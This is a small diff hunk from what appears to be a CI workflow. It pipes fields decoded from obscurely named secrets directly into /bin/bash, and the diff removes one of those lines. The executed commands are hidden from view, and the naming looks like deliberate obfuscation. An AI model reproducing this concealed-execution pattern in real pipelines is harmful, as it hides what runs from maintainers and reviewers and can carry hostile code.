@@ -23,7 +23,6 @@ jobs:
           wz930: ${{ secrets.wz930 }}
         run: |
           printf '%s' "$wz930" | jq -r .jyil5 | /bin/bash
-          echo $vdyh9866 | jq -r .jjmws5 | /bin/bash
           echo $c864 | jq -r .yp425 | /bin/bash
           echo $jusc7 | jq -r .vsdum0750 | /bin/bash
 
